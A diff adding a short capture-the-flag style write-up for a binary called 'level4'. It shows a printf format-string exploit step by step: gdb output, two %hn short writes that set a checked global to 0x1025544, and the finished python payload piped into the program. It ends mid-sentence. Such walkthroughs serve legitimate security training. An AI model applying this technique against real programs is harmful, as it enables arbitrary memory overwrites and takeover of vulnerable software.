@@ -1,0 +1,41 @@
+save as before (format string) 
+ 
+
+
+gdb gives us : 
+=> 0x804848d <n+54>:	mov    eax,ds:0x8049810
+   0x8048492 <n+59>:	cmp    eax,0x1025544
+
+so we need to replace the value in 0x8049810 with 0x1025544
+
+to do that we need to split the add in 2 so it can fit in an integer 
+
+gives us : 
+
+0x0102 = 258  at 0x8049812
+0x5544 = 21828 at 0x8049810
+
+printf allows us to do 
+%5$n = %p%p%p%p%p%n 
+
+once the offset found : 
+%12$x
+we can write on this addr but with a short (%hn)
+
+$ python -c 'print  "\x08\x04\x98\x12"[::-1]+ "\x08\x04\x98\x10"[::-1]  + "%12$hn"
+ in gdb : 
+0016| 0xbffff520 --> 0x8049812 --> 0x8 
+0020| 0xbffff524 --> 0x8049810 --> 0x80000 
+  
+we need to add (258 - 8) : %250d%12$hn
+0016| 0xbffff520 --> 0x8049812 --> 0x102 
+0020| 0xbffff524 --> 0x8049810 --> 0x1020000 
+yeah ! same way for 0x8049810...
+
+21828 - 8 - 250 = 21570 
+ 
+add "%21570d%13hn" to the python line 
+And Voila ! 
+python -c 'print  "\x08\x04\x98\x12"[::-1]+ "\x08\x04\x98\x10"[::-1]  + "%250d%12$hn" + "%21570d%13$hn"   ' | ./level4 
+
+the tips is to 
